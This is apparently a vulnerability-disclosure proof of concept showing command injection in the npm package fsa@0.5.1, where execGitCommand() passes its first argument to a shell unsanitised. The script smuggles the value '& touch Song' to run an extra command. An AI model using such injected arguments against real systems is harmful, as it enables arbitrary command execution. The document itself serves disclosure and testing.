/**
 * fsa@0.5.1 is vulnerable to command injection.
 * the injection point is located in line 63 of file "lib/rep.js" in function execGitCommand().
 * the "lib/rep.js" is required by index file of the package (i.e., index.js).
 * the first argument of execGitCommand() can be controlled by users without any sanitization.
 */

var root = require("fsa");
var attack_code = "& touch Song";
var dir = "./";
var options= {};
root.rep.execGitCommand(attack_code,dir,options,function(){});
